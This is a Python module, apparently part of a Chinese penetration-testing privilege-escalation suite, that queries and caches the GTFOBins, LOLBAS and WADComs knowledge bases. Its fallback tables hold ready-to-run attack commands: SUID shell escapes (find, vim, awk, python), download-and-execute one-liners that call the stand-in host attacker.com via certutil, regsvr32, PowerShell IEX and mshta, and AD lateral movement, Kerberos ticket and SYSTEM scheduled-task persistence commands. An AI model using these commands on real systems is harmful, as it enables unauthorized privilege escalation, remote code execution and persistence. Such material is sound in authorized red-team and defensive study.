"""
Windows/Linux提权辅助套件 - 外部知识库联动模块
==============================================
GTFOBins/LOLBAS/WADComs联动接口，支持本地缓存和在线查询。

核心能力:
    1. GTFOBins联动 - SUID/Sudo提权命令查询，Capabilities提权
    2. LOLBAS/LOLDrivers联动 - Windows可利用二进制文件和驱动查询
    3. WADComs联动 - Windows/AD攻击命令关联
    4. 本地缓存机制 - 离线fallback，定期更新

Author: 昆仑安全实验室
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import os
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# 枚举与数据模型
# =============================================================================

class KnowledgeSource(str, Enum):
    """知识库来源"""
    GTFOBINS = "gtfobins"
    LOLBAS = "lolbas"
    LOLDRIVERS = "loldrivers"
    WADCOMS = "wadcoms"


class PlatformType(str, Enum):
    """平台类型"""
    WINDOWS = "windows"
    LINUX = "linux"
    BOTH = "both"


@dataclass
class KnowledgeEntry:
    """知识库条目

    Attributes:
        entry_id: 条目ID
        source: 知识库来源
        name: 名称
        description: 描述
        platform: 平台类型
        commands: 提权/利用命令列表
        tags: 标签
        risk_level: 风险等级
        last_updated: 最后更新时间
    """
    entry_id: str = ""
    source: KnowledgeSource = KnowledgeSource.GTFOBINS
    name: str = ""
    description: str = ""
    platform: PlatformType = PlatformType.LINUX
    commands: List[Dict[str, str]] = field(default_factory=list)
    tags: List[str] = field(default_factory=list)
    risk_level: str = "medium"
    last_updated: str = ""

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "entry_id": self.entry_id,
            "source": self.source.value,
            "name": self.name,
            "description": self.description,
            "platform": self.platform.value,
            "commands": self.commands,
            "tags": self.tags,
            "risk_level": self.risk_level,
            "last_updated": self.last_updated,
        }


@dataclass
class CacheInfo:
    """缓存信息

    Attributes:
        source: 知识库来源
        last_updated: 最后更新时间
        entry_count: 条目数量
        cache_file: 缓存文件路径
        is_expired: 是否过期
    """
    source: KnowledgeSource = KnowledgeSource.GTFOBINS
    last_updated: str = ""
    entry_count: int = 0
    cache_file: str = ""
    is_expired: bool = True

    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "source": self.source.value,
            "last_updated": self.last_updated,
            "entry_count": self.entry_count,
            "cache_file": self.cache_file,
            "is_expired": self.is_expired,
        }


# =============================================================================
# GTFOBins知识库
# =============================================================================

GTFOBINS_BASE_URL = "https://gtfobins.github.io"
GTFOBINS_API_URL = f"{GTFOBINS_BASE_URL}/gtfobins"


class GTFOBinsClient:
    """GTFOBins知识库客户端

    查询SUID/Sudo/Capabilities提权命令。

    Attributes:
        _cache_dir: 缓存目录
        _cache_ttl: 缓存有效期（小时）
        _timeout: 请求超时
    """

    def __init__(
        self,
        cache_dir: Optional[str] = None,
        cache_ttl: int = 24,
        timeout: int = 10,
    ) -> None:
        """初始化GTFOBins客户端

        Args:
            cache_dir: 缓存目录
            cache_ttl: 缓存有效期（小时）
            timeout: 请求超时（秒）
        """
        self._cache_dir = cache_dir or os.path.join(
            os.path.expanduser("~"), ".kunlun", "cache", "gtfobins",
        )
        self._cache_ttl = cache_ttl
        self._timeout = timeout
        self._local_data: Dict[str, Any] = {}

    async def query_binary(self, binary_name: str) -> List[KnowledgeEntry]:
        """查询二进制文件的提权方法

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        binary_name = binary_name.lower().strip()

        cached = await self._get_from_cache(binary_name)
        if cached:
            return cached

        entries = await self._fetch_from_api(binary_name)
        if entries:
            await self._save_to_cache(binary_name, entries)

        return entries

    async def query_suid_binaries(self) -> List[str]:
        """获取所有支持SUID提权的二进制文件列表

        Returns:
            二进制文件名列表
        """
        index = await self._get_index()
        return [
            name for name, data in index.items()
            if data.get("functions", {}).get("suid", False)
        ]

    async def query_sudo_binaries(self) -> List[str]:
        """获取所有支持Sudo提权的二进制文件列表

        Returns:
            二进制文件名列表
        """
        index = await self._get_index()
        return [
            name for name, data in index.items()
            if data.get("functions", {}).get("sudo", False)
        ]

    async def query_capabilities_binaries(self) -> List[str]:
        """获取所有支持Capabilities提权的二进制文件列表

        Returns:
            二进制文件名列表
        """
        index = await self._get_index()
        return [
            name for name, data in index.items()
            if data.get("functions", {}).get("capabilities", False)
        ]

    async def _get_from_cache(self, binary_name: str) -> List[KnowledgeEntry]:
        """从缓存获取

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        cache_file = os.path.join(self._cache_dir, f"{binary_name}.json")

        if not os.path.exists(cache_file):
            return []

        try:
            mtime = os.path.getmtime(cache_file)
            if time.time() - mtime > self._cache_ttl * 3600:
                return []

            with open(cache_file, "r") as f:
                data = json.load(f)

            return [
                KnowledgeEntry(
                    entry_id=item.get("entry_id", ""),
                    source=KnowledgeSource(item.get("source", "gtfobins")),
                    name=item.get("name", ""),
                    description=item.get("description", ""),
                    platform=PlatformType(item.get("platform", "linux")),
                    commands=item.get("commands", []),
                    tags=item.get("tags", []),
                    risk_level=item.get("risk_level", "medium"),
                    last_updated=item.get("last_updated", ""),
                )
                for item in data
            ]
        except Exception as e:
            logger.debug(f"GTFOBins缓存读取失败: {e}")
            return []

    async def _save_to_cache(
        self, binary_name: str, entries: List[KnowledgeEntry],
    ) -> None:
        """保存到缓存

        Args:
            binary_name: 二进制文件名
            entries: 知识条目
        """
        os.makedirs(self._cache_dir, exist_ok=True)
        cache_file = os.path.join(self._cache_dir, f"{binary_name}.json")

        try:
            data = [e.to_dict() for e in entries]
            with open(cache_file, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.debug(f"GTFOBins缓存保存失败: {e}")

    async def _fetch_from_api(self, binary_name: str) -> List[KnowledgeEntry]:
        """从API获取

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        try:
            import urllib.request

            url = f"{GTFOBINS_API_URL}/{binary_name}/"
            req = urllib.request.Request(url)

            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                html = resp.read().decode("utf-8", errors="replace")

            return self._parse_gtfo_html(html, binary_name)

        except Exception as e:
            logger.debug(f"GTFOBins API查询失败: {e}")
            return self._get_local_fallback(binary_name)

    async def _get_index(self) -> Dict[str, Any]:
        """获取索引

        Returns:
            索引数据
        """
        if self._local_data:
            return self._local_data

        index_file = os.path.join(self._cache_dir, "index.json")

        if os.path.exists(index_file):
            try:
                mtime = os.path.getmtime(index_file)
                if time.time() - mtime < self._cache_ttl * 3600:
                    with open(index_file, "r") as f:
                        self._local_data = json.load(f)
                    return self._local_data
            except Exception:
                pass

        try:
            import urllib.request

            url = f"{GTFOBINS_BASE_URL}/json/"
            req = urllib.request.Request(url)

            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                self._local_data = json.loads(
                    resp.read().decode("utf-8", errors="replace"),
                )

            os.makedirs(self._cache_dir, exist_ok=True)
            with open(index_file, "w") as f:
                json.dump(self._local_data, f, indent=2)

        except Exception as e:
            logger.debug(f"GTFOBins索引获取失败: {e}")

        return self._local_data

    def _parse_gtfo_html(self, html: str, binary_name: str) -> List[KnowledgeEntry]:
        """解析GTFOBins HTML

        Args:
            html: HTML内容
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        entries = []

        import re

        function_pattern = re.compile(
            r'<h2 id="([^"]+)".*?<div class="language-bash highlighter-rouge">'
            r'.*?<pre><code>(.*?)</code></pre>',
            re.DOTALL,
        )

        for match in function_pattern.finditer(html):
            function_name = match.group(1)
            command_code = match.group(2).strip()

            command_code = re.sub(r'<[^>]+>', '', command_code)
            command_code = command_code.replace("&amp;", "&")
            command_code = command_code.replace("&lt;", "<")
            command_code = command_code.replace("&gt;", ">")

            entries.append(KnowledgeEntry(
                entry_id=f"gtfo_{binary_name}_{function_name}",
                source=KnowledgeSource.GTFOBINS,
                name=binary_name,
                description=f"{binary_name} - {function_name}提权方法",
                platform=PlatformType.LINUX,
                commands=[{
                    "function": function_name,
                    "command": command_code,
                }],
                tags=[function_name, binary_name],
                risk_level="high" if function_name in ["suid", "sudo"] else "medium",
                last_updated=datetime.now().isoformat(),
            ))

        return entries

    def _get_local_fallback(self, binary_name: str) -> List[KnowledgeEntry]:
        """本地fallback数据

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        common_suid = {
            "find": [{
                "function": "suid",
                "command": "find . -exec /bin/sh -p \\; -quit",
            }],
            "vim": [{
                "function": "suid",
                "command": "vim -c ':!/bin/sh -p'",
            }],
            "nmap": [{
                "function": "suid",
                "command": "nmap --interactive\n!sh",
            }],
            "python": [{
                "function": "suid",
                "command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            }],
            "bash": [{
                "function": "suid",
                "command": "bash -p",
            }],
            "less": [{
                "function": "suid",
                "command": "less /etc/profile\n!/bin/sh -p",
            }],
            "nano": [{
                "function": "suid",
                "command": "nano\n^R^X\nreset; sh -p 1>&0 2>&0",
            }],
            "awk": [{
                "function": "suid",
                "command": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            }],
            "man": [{
                "function": "suid",
                "command": "man man\n!/bin/sh -p",
            }],
        }

        if binary_name in common_suid:
            return [KnowledgeEntry(
                entry_id=f"gtfo_{binary_name}_local",
                source=KnowledgeSource.GTFOBINS,
                name=binary_name,
                description=f"{binary_name} SUID提权（本地缓存）",
                platform=PlatformType.LINUX,
                commands=common_suid[binary_name],
                tags=["suid", binary_name],
                risk_level="high",
                last_updated=datetime.now().isoformat(),
            )]

        return []


# =============================================================================
# LOLBAS知识库
# =============================================================================

LOLBAS_BASE_URL = "https://lolbas-project.github.io"
LOLBAS_API_URL = "https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/LOLBAS"


class LOLBASClient:
    """LOLBAS知识库客户端

    查询Windows可利用二进制文件。

    Attributes:
        _cache_dir: 缓存目录
        _cache_ttl: 缓存有效期（小时）
        _timeout: 请求超时
    """

    def __init__(
        self,
        cache_dir: Optional[str] = None,
        cache_ttl: int = 24,
        timeout: int = 10,
    ) -> None:
        """初始化LOLBAS客户端

        Args:
            cache_dir: 缓存目录
            cache_ttl: 缓存有效期（小时）
            timeout: 请求超时（秒）
        """
        self._cache_dir = cache_dir or os.path.join(
            os.path.expanduser("~"), ".kunlun", "cache", "lolbas",
        )
        self._cache_ttl = cache_ttl
        self._timeout = timeout
        self._local_data: Dict[str, Any] = {}

    async def query_binary(self, binary_name: str) -> List[KnowledgeEntry]:
        """查询二进制文件的利用方法

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        binary_name = binary_name.lower().strip()

        cached = await self._get_from_cache(binary_name)
        if cached:
            return cached

        entries = await self._fetch_from_api(binary_name)
        if entries:
            await self._save_to_cache(binary_name, entries)

        return entries

    async def list_binaries(self) -> List[str]:
        """获取所有LOLBAS二进制文件列表

        Returns:
            二进制文件名列表
        """
        index = await self._get_index()
        return list(index.keys())

    async def _get_from_cache(self, binary_name: str) -> List[KnowledgeEntry]:
        """从缓存获取

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        cache_file = os.path.join(self._cache_dir, f"{binary_name}.json")

        if not os.path.exists(cache_file):
            return []

        try:
            mtime = os.path.getmtime(cache_file)
            if time.time() - mtime > self._cache_ttl * 3600:
                return []

            with open(cache_file, "r") as f:
                data = json.load(f)

            return [
                KnowledgeEntry(
                    entry_id=item.get("entry_id", ""),
                    source=KnowledgeSource(item.get("source", "lolbas")),
                    name=item.get("name", ""),
                    description=item.get("description", ""),
                    platform=PlatformType(item.get("platform", "windows")),
                    commands=item.get("commands", []),
                    tags=item.get("tags", []),
                    risk_level=item.get("risk_level", "medium"),
                    last_updated=item.get("last_updated", ""),
                )
                for item in data
            ]
        except Exception as e:
            logger.debug(f"LOLBAS缓存读取失败: {e}")
            return []

    async def _save_to_cache(
        self, binary_name: str, entries: List[KnowledgeEntry],
    ) -> None:
        """保存到缓存

        Args:
            binary_name: 二进制文件名
            entries: 知识条目
        """
        os.makedirs(self._cache_dir, exist_ok=True)
        cache_file = os.path.join(self._cache_dir, f"{binary_name}.json")

        try:
            data = [e.to_dict() for e in entries]
            with open(cache_file, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.debug(f"LOLBAS缓存保存失败: {e}")

    async def _fetch_from_api(self, binary_name: str) -> List[KnowledgeEntry]:
        """从API获取

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        try:
            import urllib.request

            url = f"{LOLBAS_API_URL}/ymls/{binary_name}.yml"
            req = urllib.request.Request(url)

            with urllib.request.urlopen(req, timeout=self._timeout) as resp:
                yaml_content = resp.read().decode("utf-8", errors="replace")

            return self._parse_lolbas_yaml(yaml_content, binary_name)

        except Exception as e:
            logger.debug(f"LOLBAS API查询失败: {e}")
            return self._get_local_fallback(binary_name)

    async def _get_index(self) -> Dict[str, Any]:
        """获取索引

        Returns:
            索引数据
        """
        if self._local_data:
            return self._local_data

        index_file = os.path.join(self._cache_dir, "index.json")

        if os.path.exists(index_file):
            try:
                mtime = os.path.getmtime(index_file)
                if time.time() - mtime < self._cache_ttl * 3600:
                    with open(index_file, "r") as f:
                        self._local_data = json.load(f)
                    return self._local_data
            except Exception:
                pass

        return self._local_data

    def _parse_lolbas_yaml(self, yaml_content: str, binary_name: str) -> List[KnowledgeEntry]:
        """解析LOLBAS YAML

        Args:
            yaml_content: YAML内容
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        entries = []

        import re

        command_pattern = re.compile(
            r'- Command:\s*(.*?)\n.*?Description:\s*(.*?)\n',
            re.DOTALL,
        )

        for match in command_pattern.finditer(yaml_content):
            command = match.group(1).strip()
            description = match.group(2).strip()

            entries.append(KnowledgeEntry(
                entry_id=f"lolbas_{binary_name}_{hash(command) % 10000}",
                source=KnowledgeSource.LOLBAS,
                name=binary_name,
                description=description,
                platform=PlatformType.WINDOWS,
                commands=[{
                    "command": command,
                    "description": description,
                }],
                tags=["lolbas", binary_name],
                risk_level="high",
                last_updated=datetime.now().isoformat(),
            ))

        return entries

    def _get_local_fallback(self, binary_name: str) -> List[KnowledgeEntry]:
        """本地fallback数据

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        common_lolbas = {
            "certutil": [{
                "command": "certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe && payload.exe",
                "description": "下载并执行文件",
            }],
            "msbuild": [{
                "command": "msbuild.exe payload.csproj",
                "description": "编译并执行C#代码",
            }],
            "regsvr32": [{
                "command": "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
                "description": "执行SCT脚本",
            }],
            "csc": [{
                "command": "csc.exe /out:payload.exe payload.cs && payload.exe",
                "description": "编译C#代码",
            }],
            "powershell": [{
                "command": "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')\"",
                "description": "下载并执行PowerShell脚本",
            }],
            "wmic": [{
                "command": "wmic process call create \"payload.exe\"",
                "description": "创建进程",
            }],
            "rundll32": [{
                "command": "rundll32.exe payload.dll,EntryPoint",
                "description": "执行DLL导出函数",
            }],
            "mshta": [{
                "command": "mshta http://attacker.com/payload.hta",
                "description": "执行HTA文件",
            }],
        }

        if binary_name in common_lolbas:
            return [KnowledgeEntry(
                entry_id=f"lolbas_{binary_name}_local",
                source=KnowledgeSource.LOLBAS,
                name=binary_name,
                description=f"{binary_name} 利用方法（本地缓存）",
                platform=PlatformType.WINDOWS,
                commands=common_lolbas[binary_name],
                tags=["lolbas", binary_name],
                risk_level="high",
                last_updated=datetime.now().isoformat(),
            )]

        return []


# =============================================================================
# WADComs知识库
# =============================================================================

class WADComsClient:
    """WADComs知识库客户端

    查询Windows/AD攻击命令。

    Attributes:
        _cache_dir: 缓存目录
        _cache_ttl: 缓存有效期（小时）
        _timeout: 请求超时
    """

    def __init__(
        self,
        cache_dir: Optional[str] = None,
        cache_ttl: int = 24,
        timeout: int = 10,
    ) -> None:
        """初始化WADComs客户端

        Args:
            cache_dir: 缓存目录
            cache_ttl: 缓存有效期（小时）
            timeout: 请求超时（秒）
        """
        self._cache_dir = cache_dir or os.path.join(
            os.path.expanduser("~"), ".kunlun", "cache", "wadcoms",
        )
        self._cache_ttl = cache_ttl
        self._timeout = timeout

    async def query_command(self, attack_type: str) -> List[KnowledgeEntry]:
        """查询攻击类型的命令

        Args:
            attack_type: 攻击类型

        Returns:
            知识条目列表
        """
        cached = await self._get_from_cache(attack_type)
        if cached:
            return cached

        entries = self._get_local_data(attack_type)
        if entries:
            await self._save_to_cache(attack_type, entries)

        return entries

    async def _get_from_cache(self, attack_type: str) -> List[KnowledgeEntry]:
        """从缓存获取

        Args:
            attack_type: 攻击类型

        Returns:
            知识条目列表
        """
        cache_file = os.path.join(self._cache_dir, f"{attack_type}.json")

        if not os.path.exists(cache_file):
            return []

        try:
            mtime = os.path.getmtime(cache_file)
            if time.time() - mtime > self._cache_ttl * 3600:
                return []

            with open(cache_file, "r") as f:
                data = json.load(f)

            return [
                KnowledgeEntry(
                    entry_id=item.get("entry_id", ""),
                    source=KnowledgeSource(item.get("source", "wadcoms")),
                    name=item.get("name", ""),
                    description=item.get("description", ""),
                    platform=PlatformType(item.get("platform", "windows")),
                    commands=item.get("commands", []),
                    tags=item.get("tags", []),
                    risk_level=item.get("risk_level", "medium"),
                    last_updated=item.get("last_updated", ""),
                )
                for item in data
            ]
        except Exception as e:
            logger.debug(f"WADComs缓存读取失败: {e}")
            return []

    async def _save_to_cache(
        self, attack_type: str, entries: List[KnowledgeEntry],
    ) -> None:
        """保存到缓存

        Args:
            attack_type: 攻击类型
            entries: 知识条目
        """
        os.makedirs(self._cache_dir, exist_ok=True)
        cache_file = os.path.join(self._cache_dir, f"{attack_type}.json")

        try:
            data = [e.to_dict() for e in entries]
            with open(cache_file, "w") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.debug(f"WADComs缓存保存失败: {e}")

    def _get_local_data(self, attack_type: str) -> List[KnowledgeEntry]:
        """本地数据

        Args:
            attack_type: 攻击类型

        Returns:
            知识条目列表
        """
        wadcoms_data = {
            "enumeration": [
                KnowledgeEntry(
                    entry_id="wadcoms_enum_1",
                    source=KnowledgeSource.WADCOMS,
                    name="BloodHound",
                    description="收集AD信息并可视化攻击路径",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "SharpHound.exe -c All -d domain.com",
                        "description": "收集所有AD信息",
                    }],
                    tags=["enumeration", "bloodhound"],
                    risk_level="medium",
                    last_updated=datetime.now().isoformat(),
                ),
                KnowledgeEntry(
                    entry_id="wadcoms_enum_2",
                    source=KnowledgeSource.WADCOMS,
                    name="PowerView",
                    description="PowerShell AD枚举工具",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "Import-Module .\\PowerView.ps1\nGet-NetUser | Select-Object samaccountname",
                        "description": "枚举所有用户",
                    }],
                    tags=["enumeration", "powerview"],
                    risk_level="medium",
                    last_updated=datetime.now().isoformat(),
                ),
            ],
            "lateral_movement": [
                KnowledgeEntry(
                    entry_id="wadcoms_lm_1",
                    source=KnowledgeSource.WADCOMS,
                    name="PsExec",
                    description="远程执行命令",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "PsExec.exe \\\\target -u domain\\user -p password cmd.exe",
                        "description": "使用凭证远程执行",
                    }],
                    tags=["lateral_movement", "psexec"],
                    risk_level="high",
                    last_updated=datetime.now().isoformat(),
                ),
                KnowledgeEntry(
                    entry_id="wadcoms_lm_2",
                    source=KnowledgeSource.WADCOMS,
                    name="WMI",
                    description="WMI远程执行",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "wmic /node:target /user:domain\\user /password:password process call create \"cmd.exe\"",
                        "description": "WMI远程执行命令",
                    }],
                    tags=["lateral_movement", "wmi"],
                    risk_level="high",
                    last_updated=datetime.now().isoformat(),
                ),
            ],
            "privilege_escalation": [
                KnowledgeEntry(
                    entry_id="wadcoms_pe_1",
                    source=KnowledgeSource.WADCOMS,
                    name="Rubeus",
                    description="Kerberos攻击工具",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "Rubeus.exe asktgt /user:administrator /rc4:hash",
                        "description": "请求TGT",
                    }],
                    tags=["privilege_escalation", "kerberos"],
                    risk_level="high",
                    last_updated=datetime.now().isoformat(),
                ),
            ],
            "persistence": [
                KnowledgeEntry(
                    entry_id="wadcoms_persist_1",
                    source=KnowledgeSource.WADCOMS,
                    name="Scheduled Task",
                    description="计划任务持久化",
                    platform=PlatformType.WINDOWS,
                    commands=[{
                        "command": "schtasks /create /tn \"Update\" /tr \"C:\\payload.exe\" /sc onlogon /ru SYSTEM",
                        "description": "创建计划任务",
                    }],
                    tags=["persistence", "scheduled_task"],
                    risk_level="high",
                    last_updated=datetime.now().isoformat(),
                ),
            ],
        }

        return wadcoms_data.get(attack_type, [])


# =============================================================================
# 主知识库联动接口
# =============================================================================

class KnowledgeBaseInterface:
    """外部知识库联动接口

    整合GTFOBins/LOLBAS/WADComs查询。

    Attributes:
        _gtfobins: GTFOBins客户端
        _lolbas: LOLBAS客户端
        _wadcoms: WADComs客户端
    """

    def __init__(
        self,
        cache_dir: Optional[str] = None,
        cache_ttl: int = 24,
        timeout: int = 10,
    ) -> None:
        """初始化知识库联动接口

        Args:
            cache_dir: 缓存目录
            cache_ttl: 缓存有效期（小时）
            timeout: 请求超时（秒）
        """
        self._gtfobins = GTFOBinsClient(cache_dir, cache_ttl, timeout)
        self._lolbas = LOLBASClient(cache_dir, cache_ttl, timeout)
        self._wadcoms = WADComsClient(cache_dir, cache_ttl, timeout)

    async def query_suid_binary(self, binary_name: str) -> List[KnowledgeEntry]:
        """查询SUID二进制文件

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        return await self._gtfobins.query_binary(binary_name)

    async def query_lolbas_binary(self, binary_name: str) -> List[KnowledgeEntry]:
        """查询LOLBAS二进制文件

        Args:
            binary_name: 二进制文件名

        Returns:
            知识条目列表
        """
        return await self._lolbas.query_binary(binary_name)

    async def query_wadcoms_command(self, attack_type: str) -> List[KnowledgeEntry]:
        """查询WADComs攻击命令

        Args:
            attack_type: 攻击类型

        Returns:
            知识条目列表
        """
        return await self._wadcoms.query_command(attack_type)

    async def get_cache_info(self) -> Dict[str, CacheInfo]:
        """获取缓存信息

        Returns:
            缓存信息
        """
        info = {}

        for source in KnowledgeSource:
            cache_dir = os.path.join(
                os.path.expanduser("~"), ".kunlun", "cache", source.value,
            )
            cache_file = os.path.join(cache_dir, "index.json")

            is_expired = True
            entry_count = 0
            last_updated = ""

            if os.path.exists(cache_file):
                try:
                    mtime = os.path.getmtime(cache_file)
                    is_expired = time.time() - mtime > 24 * 3600
                    last_updated = datetime.fromtimestamp(mtime).isoformat()

                    with open(cache_file, "r") as f:
                        data = json.load(f)
                        entry_count = len(data)
                except Exception:
                    pass

            info[source.value] = CacheInfo(
                source=source,
                last_updated=last_updated,
                entry_count=entry_count,
                cache_file=cache_file,
                is_expired=is_expired,
            )

        return info

    async def update_cache(self, force: bool = False) -> Dict[str, bool]:
        """更新缓存

        Args:
            force: 强制更新

        Returns:
            更新结果
        """
        results = {}

        try:
            gtfobins_index = await self._gtfobins._get_index()
            results["gtfobins"] = bool(gtfobins_index)
        except Exception as e:
            logger.debug(f"GTFOBins缓存更新失败: {e}")
            results["gtfobins"] = False

        try:
            lolbas_index = await self._lolbas._get_index()
            results["lolbas"] = bool(lolbas_index)
        except Exception as e:
            logger.debug(f"LOLBAS缓存更新失败: {e}")
            results["lolbas"] = False

        return results


# =============================================================================
# 全局单例
# =============================================================================

_knowledge_base: Optional[KnowledgeBaseInterface] = None


def get_knowledge_base() -> KnowledgeBaseInterface:
    """获取知识库联动接口全局单例

    Returns:
        KnowledgeBaseInterface 实例
    """
    global _knowledge_base
    if _knowledge_base is None:
        _knowledge_base = KnowledgeBaseInterface()
    return _knowledge_base


__all__ = [
    "KnowledgeBaseInterface",
    "GTFOBinsClient",
    "LOLBASClient",
    "WADComsClient",
    "KnowledgeEntry",
    "CacheInfo",
    "KnowledgeSource",
    "PlatformType",
    "GTFOBINS_BASE_URL",
    "GTFOBINS_API_URL",
    "LOLBAS_BASE_URL",
    "LOLBAS_API_URL",
    "get_knowledge_base",
]
